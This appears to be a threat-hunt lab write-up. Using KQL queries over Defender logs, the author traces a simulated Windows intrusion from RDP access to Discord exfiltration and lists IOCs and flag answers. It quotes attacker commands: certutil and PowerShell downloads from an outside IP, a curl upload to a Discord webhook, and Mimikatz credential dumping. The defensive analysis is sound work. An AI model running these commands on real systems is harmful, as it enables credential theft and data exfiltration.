## Table of Contents

- Summary of Findings
- Threat Hunt
- Timeline
- MITRE ATT&CK Framework
- Indicators of Compromise (IOCs)
- Lessons Learned 
- Recommendations

## Summary of Findings
Below is a dropdown of all the findings for this threat hunt. 

To see my investigation steps, continue to the next section **Threat Hunt**
<details>
  <summary>SPOILERS: Show Findings</summary>
	
  <table>

| Flag |                                 Objective                                  |                  Finding                  |           Timestamp            |
| :--: | :------------------------------------------------------------------------: | :---------------------------------------: | :----------------------------: |
|  1   | Identify the source IP address of the Remote Desktop Protocol connection?  |              `88.97.178.12`               | `2025-11-19T18:36:18.503997Z`  |
|  2   |     Identify the user account that was compromised for initial access?     |               `kenji.sato`                | `2025-11-19T18:36:18.503997Z`  |
|  3   |  Identify the command and argument used to enumerate network neighbours?   |                 `arp -a`                  | `2025-11-19T19:04:01.773778Z`  |
|  4   |      Identify the PRIMARY staging directory where malware was stored?      |       `C:\ProgramData\WindowsCache`       | `2025-11-19T19:05:33.7665036Z` |
|  5   |   How many file extensions were excluded from Windows Defender scanning?   |                    `3`                    | `2025-11-19T18:49:29.1787135Z` |
|  6   |  What temporary folder path was excluded from Windows Defender scanning?   | `C:\Users\KENJI~1.SAT\AppData\Local\Temp` | `2025-11-19T18:49:27.6830204Z` |
|  7   | Identify the Windows-native binary the attacker abused to download files?  |               `certutil.exe`              | `2025-11-19T19:06:58.5778439Z` |
|  8   |      Identify the name of the scheduled task created for persistence?      |          `Windows Update Check`           | `2025-11-19T19:07:46.9796512Z` |
|  9   |       Identify the executable path configured in the scheduled task?       | `C:\ProgramData\WindowsCache\svchost.exe` | `2025-11-19T19:07:46.9796512Z` |
|  10  |         Identify the IP address of the command and control server?         |              `78.141.196.6`               | `2025-11-19T19:11:04.1766386Z` |
|  11  | Identify the destination port used for command and control communications? |                   `443`                   | `2025-11-19T19:11:04.1766386Z` |
|  12  |           Identify the filename of the credential dumping tool?            |                 `mm.exe`                  | `2025-11-19T19:07:22.8551193Z` |
|  13  |      Identify the module used to extract logon passwords from memory?      |        `sekurlsa::logonpasswords`         | `2025-11-19T19:08:26.2804285Z` |
|  14  |    Identify the compressed archive filename used for data exfiltration?    |             `export-data.zip`             | `2025-11-19T19:08:58.0244963Z` |
|  15  |         Identify the cloud service used to exfiltrate stolen data?         |                 `discord`                 | `2025-11-19T19:09:21.4234133Z` |
|  16  |       Identify the first Windows event log cleared by the attacker?        |                `Security`                 | `2025-11-19T19:11:39.0934399Z` |
|  17  |      Identify the backdoor account username created by the attacker?       |                 `support`                 | `2025-11-19T19:09:48.8977132Z` |
|  18  |   Identify the PowerShell script file used to automate the attack chain?   |               `wupdate.ps1`               | `2025-11-19T18:49:48.7079818Z` |
|  19  |             What IP address was targeted for lateral movement?             |               `10.1.0.188`                | `2025-11-19T19:10:42.057693Z`  |
|  20  |         Identify the remote access tool used for lateral movement?         |                `mstsc.exe`                | `2025-11-19T19:10:42.057693Z`  |
|      |                                                                            |                                           |                                |

  </table>

</details>

## Threat Hunt

## 🚩 Flag 1: Initial Access - Remote Access Source
Objective: **Identify the source IP address of the Remote Desktop Protocol connection?**

Remote Desktop Protocol connections leave network traces that identify the source of unauthorised access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.

So within `DevicelogonEvents`, I would be searching for successful logon events coming from a public IP address during our incident timeframe. Public IP addresses would be coming from outside the organization's network.

```KQL
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "LogonSuccess"
| where RemoteIPType == "Public"
| project Timestamp, AccountName, ActionType, LogonType, RemoteIPType, RemoteIP, RemotePort
| sort by Timestamp asc
```
<img width="1269" height="337" alt="Screenshot 2026-01-07 at 6 24 33 PM" src="https://github.com/user-attachments/assets/bc62ef5a-df06-4250-9a32-347a4dff3723" />

From my query, I found a single public IP address, `88.97.178.12` that was able to succesfully remote into a user account. 

Flag: `88.97.178.12` <br>
Timestamp: `2025-11-19T18:36:18.503997Z`

## 🚩 Flag 2: Initial Access - Compromised User Account
Objective: **Identify the user account that was compromised for initial access?**

Identifying which credentials were compromised determines the scope of unauthorised access and guides remediation efforts including password resets and privilege reviews.

Using information gathered from the previous KQL query, the attacker was able to successfully login to the user account `kenji.sato`

Flag: `kenji.sato` <br> 
Timestamp: `2025-11-19T18:36:18.503997Z`

## 🚩 Flag 3: Discovery - Network Reconaissance
Objective: **Identify the command and argument used to enumerate network neighbours?**

Attackers enumerate network topology to identify lateral movement opportunities and high-value targets. This reconnaissance activity is a key indicator of advanced persistent threats.

Common tools used in [network discovery](https://attack.mitre.org/techniques/T1016/) include arp, ipconfig, ifconfig, nbstat, and route. So I decided to search through `DeviceProcessEvents` for any of these tools used on the command line.  
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_any ("arp", "ipconfig", "nbstat", "route")
| project Timestamp, AccountName, ProcessCommandLine
| sort by Timestamp asc
```
<p align="center"> 
	<img width="555" height="339" alt="Screenshot 2026-01-07 at 6 52 18 PM" src="https://github.com/user-attachments/assets/c66dfc1f-7920-4a12-a5a8-72505f49ab1e" />
</p>

From the results, we see two of these tools used to discover more information about the network: 
- `ipconfig.exe /all`
- `arp.exe -a`

Although `ipconfig.exe /all` can be used in the discovery process, it only provides local host network configurations.
On the other hand, `arp.exe -a` reveals other systems on the local network (including IP addresses and MAC addresses).

Flag: `arp -a` <br>
Timestamp: `2025-11-19T19:04:01.773778Z`

## 🚩 Flag 4: Defense Evasion - Malware Staging Directory
Objective: **Identify the PRIMARY staging directory where malware was stored?**

Attackers establish staging locations to organise tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.

BLAHBLAHBLAH
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_any ("mkdir", "New-Item", "attrib")
| project Timestamp, ActionType, FileName, FolderPath, ProcessCommandLine, SHA256
| sort by Timestamp asc
```
<img width="1250" height="346" alt="Screenshot 2026-01-07 at 9 21 05 PM" src="https://github.com/user-attachments/assets/c5a20bee-9431-45e8-a946-c008581f17f8" />


The attacker ran the following command `"attrib.exe" +h +s C:\ProgramData\WindowsCache`
- `attrib.exe` Windows utility to view or change file or folder attributes
- `+h` mark as hidden
- `+s` mark as system folder
- `C:\ProgramData\WindowsCache` newly created directory

The directory `C:\ProgramData\WindowsCache` is specifically crafted to resemble a Windows System directory to evade detection. If I didn't know any better, I would think this would be a common Windows directory.

Flag: `C:\ProgramData\WindowsCache` <br>
Timestamp: `2025-11-19T19:05:33.7665036Z`

## 🚩 Flag 5: Defense Evasion - File Extension Exclusions
Objective: **How many file extensions were excluded from Windows Defender scanning?**

Attackers add file extension exclusions to Windows Defender to prevent scanning of malicious files. Counting these exclusions reveals the scope of the attacker's defense evasion strategy.

Microsoft Defender Exclusions are set by Registry Keys, specifically at `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions`. So to see if the attacker set any file extension exclusions, I searched within `DeviceRegistryEvents` for any logs that contained that location.
```KQL
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryKey contains "Exclusions\\Extensions"
| project Timestamp, ActionType, RegistryValueName, RegistryKey
| sort by Timestamp asc
```
<img width="1055" height="369" alt="Screenshot 2026-01-07 at 7 09 05 PM" src="https://github.com/user-attachments/assets/b2c8ac23-c25c-4afd-82f5-440290f64902" />

From the query, there were three different file extensions that were excluded from Windows Defender scanning: 
- `.exe`
- `.ps1`
- `.bat`

This would allow the attacker to download or execute any executable or script without triggering Microsoft Defender.

Flag: `3` <br>
Timestamp: `2025-11-19T18:49:29.1787135Z`

## 🚩 Flag 6: Defense Evasion - Temporary Folder Exclusion
Objective: **What temporary folder path was excluded from Windows Defender scanning?**

Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.

We know that the attacker is looking to download or execute malicious executables (.exe exclusion) and scripts (.ps1 and .bat exclusions), but these files need a location to reside without being detected by users or security tools. 
So, they're more than likely to set exclusions to specific folders for their malicious activities. Again, these directory exclusions are set by registry keys at `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`, so we can search for this location within the query.
```KQL
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryKey contains "Exclusions\\Paths"
| project Timestamp, ActionType, RegistryKey, RegistryValueName
| sort by Timestamp asc
```
<img width="1114" height="330" alt="Screenshot 2026-01-07 at 7 11 35 PM" src="https://github.com/user-attachments/assets/aaa4b77b-3372-4cde-aa92-d4e8e1647a8f" />

I found two directories that we excluded from being scanned by Windows Defender:
- `C:\ProgramData\WindowsCache` the primary staging directory we discovered in Flag 4
- `C:\Users\KENJI~1.SAT\AppData\Local\Temp` new temp directory discovered

This temp folder is most likely a directory where executables ands scripts can be ran without any interference from Defender. 

Flag: `C:\Users\KENJI~1.SAT\AppData\Local\Temp` <br>
Timestamp: `2025-11-19T18:49:27.6830204Z`

## 🚩 Flag 7: Defense Evasion - Download Utility Abuse
Objective: **Identify the Windows-native binary the attacker abused to download files?**

Legitimate system utilities are often weaponized to download malware while evading detection. Identifying these techniques helps improve defensive controls.

Malicious downloads are more than likely going to be downloaded from the web. So I focused my attention on `DeviceProcessEvents` where the command line includes some form of `http` within it. 
[LOLbins](https://lolbas-project.github.io/) are legitimate Windows Utility tools that can be used maliciously, so I will keep an eye out for any tools from the list. 

```KQL
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "http"
| project Timestamp, ActionType, FileName, FolderPath, FileSize, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1274" height="551" alt="Screenshot 2026-01-07 at 7 16 40 PM" src="https://github.com/user-attachments/assets/96fded26-4adc-4f01-a95b-6938cc5d9979" />

After scrolling through the million of logs from Google Chrome checking for an update every 5 minutes, I discovered `certutil.exe` being used to download an executable to the primary stagin directory.

`"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`
- `certutil.exe` legitimate Windows tool
- `-urlcache` store url in local cache
- `-f` force download
- `http://78.141.196.6:8080/AdobeGC.ex` downloads `AdobeGC.ex` from IP address
- `C:\ProgramData\WindowsCache\mm.exe` saves download file to location as `mm.exe`

`"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`
- `certutil.exe` legitimate Windows tool
- `-urlcache` store url in local cache
- `-f` force download
- `http://78.141.196.6:8080/svchost.exe` downloads `svchost.exe` from IP address
- `C:\ProgramData\WindowsCache\svchost.exe` saves downloaded file to location as `svchost.exe`

Flag: `certutil.exe` <br>
Timestamp: `2025-11-19T19:06:58.5778439Z`

## 🚩 Flag 8: Persistence - Scheduled Task Name
Objective: **Identify the name of the scheduled task created for persistence?**

Scheduled tasks provide reliable persistence across system reboots. The task name often attempts to blend with legitimate Windows maintenance routines.

To find out if the attacker set any scheduled tasks, I checked `DeviceProcessEvents` to see if `schtasks` was ever ran. 
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
| where FileName contains "schtask"
| project Timestamp, ActionType, FileName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1276" height="346" alt="Screenshot 2026-01-07 at 7 18 31 PM" src="https://github.com/user-attachments/assets/562912c0-b215-4abc-a8b0-b84f3c25e0a9" />

From the query, we can see that the attacker did createa a scheduled task by running `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f`
- `/create /tn "Windows Update Check"` create task name `Windows Upadte Check`
- `/tr C:ProgramData\WindowsCache\svchost.exe` run malicious `svchost.exe`
- `/sc daily /st 2:00` run daily at 2:00 am
- `/ru SYSTEM` run tasks from SYSTEM
- `f` force

The attacker created a scheduled task to run their malware `svchost.exe`. It's also persistent since the task runs every day at 0200. So even after the system is rebooted, if the system is active at 0200, this task will automatically run. Additionally, they tried masquerading this scheduled task with the name `Windows Update Check` as if this was a legitimate task set by Windows.

Flag: `Windows Update Check` <br>
Timestamp: `2025-11-19T19:07:46.9796512Z`

## 🚩 Flag 9: Persistence - Scheduled Task Target
Objective: **Identify the executable path configured in the scheduled task?

The scheduled task action defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.

Looking at the command line, we see the attacker staging a `svchost.exe` LOLBin at `C:\ProgramData\WindowsCache\svchost.exe` 

Flag: `C:\ProgramData\WindowsCache\svchost.exe` <br>
Timestamp: `2025-11-19T19:07:46.9796512Z`

## 🚩 Flag 10: Command & Control - C2 Server Address
Objective: **Identify the IP address of the command and control server?**

Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.

If the attacker were to setup some form of C2, they would most likely be operating from one of the two directories excluded from Windows Defender security checks. So within `DeviceNetworkEvents`, I searched for these two folders in `InitiatngProcessFolderPath`.
```KQL
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
| where InitiatingProcessFolderPath has_any  ("C:\\ProgramData\\WindowsCache", "C:\\Users\\KENJI~1.SAT\\AppData\\Local\\Temp")
| sort by Timestamp asc
```
<img width="1878" height="378" alt="Screenshot_35" src="https://github.com/user-attachments/assets/1a9cad2c-1dc3-4971-896b-d5de9179e92a" />

Which is true as there is a single successful connection coming from `C:\ProgramData\WindowsCache` that connects to `78.141.196.6`
This can be cross-referenced from the command discovered in Flag 7 as this is the same IP address that was used to downlaod the malware. 

Flag: `78.141.196.6` <br>
Timestamp: `2025-11-19T19:11:04.1766386Z`

## 🚩 Flag 11: Command & Control - C2 Communication Port
Objective: **Identify the destination port used for command and control communications?**

C2 communication ports can indicate the framework or protocol used. This information supports network detection rules and threat intelligence correlation.

From the query and screenshot the attacker was able to connect to `78.141.196.6` over port `443` 

Flag: `443` <br>
Timestamp: `2025-11-19T19:11:04.1766386Z`

## 🚩 Flag 12: Command & Control - Credential Theft Tool
Objective: **Identify the filename of the credential dumping tool?**

Credential dumping tools extract authentication secrets from system memory. These tools are typically renamed to avoid signature-based detection.

Again, if I were in the attacker's shoes, the only safe location I would be executing malware from would be the two directories excluded from Windows Defender scanning.

```KQL
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
| where FolderPath has_any ("C:\\ProgramData\\WindowsCache", "C:\\Users\\KENJI~1.SAT\\AppData\\Local\\Temp")
| sort by Timestamp asc
```
<img width="1179" height="399" alt="Screenshot 2026-01-07 at 7 27 53 PM" src="https://github.com/user-attachments/assets/ecb70c7e-3742-4728-bf3a-72207be9b554" />

Searching these two different locations return the following files located in these directories:
- `export-data.zip` potential archive of exfiltrated data
- `mm.exe` unknown executable downloaded from `78.141.196.6`
- `svchost.exe` file executed in malicious scheduled task

Since Sentinel also collects the SHA256 hash of files, we can grab the hash of `mm.exe` (`61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1`), and toss this into [VirusTotal](https://www.virustotal.com/) to see if any security vendors have flagged this file before:
<img width="1199" height="684" alt="Screenshot 2026-01-09 at 6 44 15 PM" src="https://github.com/user-attachments/assets/ae26bffd-6529-44dd-988c-94e9cd03c0ab" />

Boom. 65/71 hits on this SHA 256 Hash. <br>

The attacker is using [Mimikatz](https://attack.mitre.org/software/S0002/), a popular credential dumper used to collect Windows logins and passwords that are stored in cleartext. The attacker renamed their malware to `mm.exe` to be less suspicious. 

Flag: `mm.exe` <br>
Timestamp: `2025-11-19T19:07:22.8551193Z`

## 🚩 Flag 13: Credential Access - Memory Extraction Module
Objective: **Identify the module used to extract logon passwords from memory?**

Credential dumping tools use specific modules to extract passwords from security subsystems. Documenting the exact technique used aids in detection engineering.

Thankfully, [Mimikatz](https://github.com/ParrotSec/mimikatz) is open source so we can figure out what the attacker did if it was actually executed on this machine.
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "mm.exe"
| project Timestamp, ActionType, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1272" height="345" alt="Screenshot 2026-01-07 at 7 30 10 PM" src="https://github.com/user-attachments/assets/0ae9a21c-11df-4dbd-abca-ca8f4ee637db" />

`mm.exe` was ran a single time from the command line using `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`
- `privilege::debug` grants user to debug or interact with running processes
- `sekurlsa::logonpasswords` mimikatz payload to caputre credentials from LSASS memory
- `exit` closes mimikatz after dumping credentials

Flag: `sekurlsa::logonpasswords` <br>
Timestamp: `2025-11-19T19:08:26.2804285Z`

## 🚩 Flag 14: Collection - Data Staging Archive
Objective: **Identify the compressed archive filename used for data exfiltration?**

Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.

We've already seen `export-data.zip` located in `C:\ProgramData\WindowsCache` but let's see if there are any other archive files in this directory.
```KQL
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FolderPath contains "C:\\ProgramData\\WindowsCache"
| where FileName endswith ".zip"
| project Timestamp, ActionType, FileName, FileSize, FolderPath, SHA256, InitiatingProcessCommandLine
| sort by Timestamp asc
```
<img width="1277" height="322" alt="Screenshot 2026-01-07 at 7 32 38 PM" src="https://github.com/user-attachments/assets/ff00ff6c-354f-4ec4-8fb0-704cfdc52ac9" />

Nope. `export-data.zip` is the only one discovered. This archive most likely contains all of the captured data and is going to be exfiltrated from the system.

Flag: `export-data.zip` <br>
Timestamp: `2025-11-19T19:08:58.0244963Z`

## 🚩 Flag 15: Exfiltration - Exfiltration Channel
Objective: **Identify the cloud service used to exfiltrate stolen data?**

Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.

We have an idea of what archive contains captured data, so let's look if any network events contain it:
```KQL
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
| where InitiatingProcessCommandLine contains "export-data.zip"
| where ActionType == "ConnectionSuccess"
| where RemotePort == "443"
| project Timestamp, ActionType, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| sort by Timestamp asc
```
<img width="1271" height="311" alt="Screenshot 2026-01-07 at 7 34 43 PM" src="https://github.com/user-attachments/assets/789fc949-9046-4cd5-8c95-4361c0445ed3" />

Unfortunately there is a successful outbound connection containing this file. The attacker was able to run the command:
`"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8`
- `curl.exe` command line tool used to transfer data
- `-F` form data POST request
- `file=@C:\ProgramData\WindowsCache\export-data.zip` target file
- `https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8` output location

Based on this command, the attacker was able to exfiltrate this archive to `Discord`. 

Flag: `discord` <br>
Timestamp: `2025-11-19T19:09:21.4234133Z`

## 🚩 Flag 16: Anti-Forensics - Log Tampering 
Objective: **Identify the first Windows event log cleared by the attacker?**

Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.

`wevutil.exe` is a Windows tool that allows the user to manage event logs. This can be utilized by attackers to erase evidence of thier activity. 
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
| where ProcessCommandLine contains "wevtutil"
| sort by Timestamp asc
```
<img width="1290" height="561" alt="Screenshot 2026-01-07 at 7 38 33 PM" src="https://github.com/user-attachments/assets/ae50f18d-1bd4-404d-bcf7-102d943ff7f0" />

The attacker was able to run wevutil multiple times to clear the following log types:
- `Security`
- `System`
- `Application`

Flag: `Security` <br>
Timestamp: `2025-11-19T19:11:39.0934399Z`

## 🚩 Flag 17: Impact - Persistence Account
Objective: **Identify the backdoor account username created by the attacker?**

Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.

Attackers can use the `net accounts` command to manage local user accounts. If I wanted to see newly created accounts, we could search specifically for the `/add` function.
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "/add"
| project Timestamp, ActionType, ProcessCommandLine
| sort by Timestamp asc 
```
<img width="1866" height="468" alt="Screenshot_6" src="https://github.com/user-attachments/assets/54a659f6-c966-4dc4-89f4-648ba3b30b38" />

The attacker was able to successfully add the user account `support` as well as adding them to the Administrators local group. This account will need to be disabled as this account provides them with persistence to local admin privileges. 

Flag: `support` <br>
Timestamp: `2025-11-19T19:09:48.8977132Z`

## 🚩 Flag 18: Execution - Malicious Script 
Objective: **Identify the PowerShell script file used to automate the attack chain?**

Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.

To find the actual script that was ran, I knew that the file would either be a `.ps1` or `.bat` file as they were excluded from scanning by Windows Defender. Sripts are usually ran within `temp` folders for evasion purposes. 
```KQL
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName endswith ".ps1" or FileName endswith ".sh"
| where FolderPath contains "temp"
| project Timestamp, ActionType, FileName, FileSize, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```
<img width="1274" height="542" alt="Screenshot 2026-01-07 at 7 44 47 PM" src="https://github.com/user-attachments/assets/e702bc5a-3d22-491a-ad0c-af97245c063c" />

With this qeury, I discovered `wupdate.ps1` located in `C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1` that was ran by the following PowerShell script: 

`powershell  -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"`
-  `ExecutionPolicy Bypass` disables powershell execution restrictions
-  `Command` execute the following string 
-  `Invoke-WebRequest` PowerShell using HTTP methods
-  `Uri 'http://78.141.196.6:8080/wupdate.ps1'` downloads `wupdate.ps1` from `78.141.196.6` over port `8080`
-  `-OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1'` save downloaded file to this folder path
-  `UseBasicParsing` disables Windows Explorer dependency

Flag: `wupdate.ps1` <br>
Timestamp: `2025-11-19T18:49:48.7079818Z`

## 🚩 Flag 19: Lateral Movement - Secondary Target
Objective: **What IP address was targeted for lateral movement?**

Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.

Lateral movements to other internal targets are most likely conducted over a Private IP type. So I checked `DeviceNetworkEvents` for related events
```KQL
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RemoteIPType == "Private"
| project Timestamp, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteIPType, RemoteUrl
| sort by Timestamp asc
```
<img width="1273" height="409" alt="Screenshot 2026-01-07 at 7 48 20 PM" src="https://github.com/user-attachments/assets/0ca8dd72-02c7-40f5-be19-d62baaffa59e" />

The attacker utilized `"mstsc.exe" /v:10.1.0.188` to move laterally to another system in the network over port `3389`.
- `mstsc.exe` Remote Desktop Protocol (RDP)
- `/v:10.1.0.188` connect to `10.1.0.188` 

Flag: `10.1.0.188` <br>
Timestamp: `2025-11-19T19:10:42.057693Z`

## 🚩 Flag 20: Lateral Movement - Remote Access Tool
Objective: **Identify the remote access tool used for lateral movement?**

Built-in remote access tools are preferred for lateral movement as they blend with legitimate administrative activity. This technique is harder to detect than custom tools.

From previous flag, we can see the attacker using `mstsc.exe`, Windows Remote Desktpo Protocol (RDP), to connect to an internal IP address. 

Flag: `mstsc.exe` <br>
Timestamp: `2025-11-19T19:10:42.057693Z`

## Timeline
With the information gathered, there are plenty of artifacts to draft a rough timeline of events guided by the [MITRE ATT&CK Framework]()

<details>
  <summary>TABLE: Attack Timeline</summary>
	
  <table>
	  
|          **Timestamp**         	| **ATT&CK Tactics** 	|                                                                              **Event**                                                                              	|
|:------------------------------:	|:------------------:	|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------:	|
|  `2025-11-19T18:36:18.503997Z` 	|   Initial Access   	|                      External IP `88.97.178.12` successfully authenticated via RDP to `azuki-sl` using credentials of user account`kenji.sato`                      	|
| `2025-11-19T18:49:27.6830204Z` 	|   Defense Evasion  	|                     Windows Defender exclusions set for directories `C:\Users\KENJI~1.SAT\AppData\Local\Temp` and `C:\ProgramData\WindowsCache`                     	|
| `2025-11-19T18:49:29.1787135Z` 	|   Defense Evasion  	|                                            Windows Defender exclusions set for file extensions `.exe`, `.ps1`, and `.bat`                                           	|
| `2025-11-19T18:49:48.7079818Z` 	|      Execution     	| PowerShell script executed to download malicious script `wupdate.ps1` from `78.141.196.6` over port `8080` into `C:\Users\kenji.sato\AppData\Local\Temp\` directory 	|
|  `2025-11-19T19:04:01.773778Z` 	|      Discovery     	|                                               Attacker ran `arp.exe -a` to enumerate systems within the local network                                               	|
| `2025-11-19T19:05:33.7665036Z` 	|   Defense Evasion  	|                  Attacker ran `attrib.exe" +h +s C:\ProgramData\WindowsCache` to create hidden system folder used as the Primary Staging directory                  	|
| `2025-11-19T19:06:58.5778439Z` 	|      Execution     	|                         Attacker utilizes `certutil.exe` to download malicious payloads `mm.exe` and `svchost.exe` from `78.141.196.6:8080`                         	|
| `2025-11-19T19:07:46.9796512Z` 	|     Persistence    	|                             Attacker created scheduled task `Windows Update Check` to execute malicious `svchost.exe` daily as `SYSTEM`                             	|
| `2025-11-19T19:08:26.2804285Z` 	|  Credential Access 	|                                  Attacker executes Mimikatz using `sekurlsa::logonpasswords` to dump credentials from LSASS Memory                                  	|
| `2025-11-19T19:08:58.0244963Z` 	|     Collection     	|                                           `export-data.zip` created within staging directory `C:\ProgramData\WindowsCache`                                          	|
| `2025-11-19T19:09:21.4234133Z` 	|    Exfiltration    	|                                                 Attacker exfiltrates `export-data.zip` via `curl` command to Discord                                                	|
| `2025-11-19T19:09:48.8977132Z` 	|     Persistence    	|                                         Attacker creates backdoor using local account `support` with local admin privileges                                         	|
|  `2025-11-19T19:10:42.057693Z` 	|  Lateral Movement  	|                                                 Attacker initiated RDP via `mstsc.exe` to internal host `10.1.0.188`                                                	|
| `2025-11-19T19:11:04.1766386Z` 	|  Command & Control 	|                                             `svchost.exe` connects to external IP address `78.141.196.6` over port `443`                                            	|
| `2025-11-19T19:11:39.0934399Z` 	|  Defense Evasion   	|                                            Attacker executes `wevutil cl` to clear Security, System, and Application logs                                           	|

  </table>

</details>

## Indicators of Compromise (IOCs)

<details>
  <summary>TABLE: Indicators of Compromise</summary>
	
  <table>

|    **Type**    	|               **Indicator**               	|                            **Description**                            	|
|:--------------:	|:-----------------------------------------:	|:---------------------------------------------------------------------:	|
|   IP Address   	|               `88.97.178.12`              	|      External source IP used for unauthorized RDP initial access      	|
|   IP Address   	|               `78.141.196.6`              	|      Malware staging server and command-and-control (C2) endpoint     	|
|      Port      	|                   `3389`                  	|         RDP port used for initial access and lateral movement         	|
|      Port      	|                   `8080`                  	|           Port used to host and download malicious payloads           	|
|      Port      	|                   `443`                   	|                Encrypted C2 and data exfiltration port                	|
|     Domain     	|         `discord.com/api/webhooks`        	|               Cloud service abused for data exfiltration              	|
|  User Account  	|                `kenji.sato`               	|            Compromised user account used for initial access           	|
|  User Account  	|                 `support`                 	|      Backdoor local administrator account created for persistence     	|
|      File      	|                  `mm.exe`                 	|                Renamed Mimikatz credential dumping tool               	|
|      File      	|               `svchost.exe`               	|             Malicious payload executed via scheduled task             	|
|      File      	|               `wupdate.ps1`               	|               PowerShell script used to automate attack               	|
|      File      	|             `export-data.zip`             	|               Compressed archive containing stolen data               	|
|    Directory   	|       `C:\ProgramData\WindowsCache`       	| Hidden system-like directory used as primary malware staging location 	|
|    Directory   	| `C:\Users\KENJI~1.SAT\AppData\Local\Temp` 	|         Defender excluded directory used for script execution         	|
|    Directory   	|  `C:\Users\kenji.sato\AppData\Local\Temp` 	|             Temporary ddirectory used for script execution            	|
|     Command    	|        `certutil.exe -urlcache -f`        	|         Living-off-the-Land binary abused to download malware         	|
|     Command    	|    `powershell -ExecutionPolicy Bypass`   	|   PowerShell execution policy bypass for malicious script execution   	|
|     Command    	|            `Invoke-WebRequest`            	|          PowerShell command used to download remote payloads          	|
|     Command    	|         `sekurlsa::logonpasswords`        	|          Mimikatz module used to dump credentials from LSASS          	|
|     Command    	|    `curl.exe -F file=@export-data.zip`    	|           Command used to exfiltrate stolen data to Discord           	|
| Scheduled Task 	|           `Windows Update Check`          	|            Malicious scheduled task created for persistence           	|
|      Tool      	|                `mstsc.exe`                	|              Windows RDP client used for lateral movement             	|
|   IP Address   	|                `10.1.0.188`               	|             Internal system targeted for lateral movement             	|
|    Event Log   	|                 `Security`                	|              Windows event log cleared for anti-forensics             	|
|    Event Log   	|                  `System`                 	|              Windows Event log cleared for anti-forensics             	|
